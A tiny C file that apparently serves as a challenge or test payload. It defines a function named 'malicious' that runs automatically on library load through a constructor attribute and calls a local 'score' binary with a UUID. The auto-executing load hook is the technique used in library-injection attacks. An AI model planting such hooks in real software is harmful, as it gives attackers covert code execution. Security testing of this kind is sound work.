#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score 5851c73e-0d0a-4df0-b5e5-87724a0df71d");
}
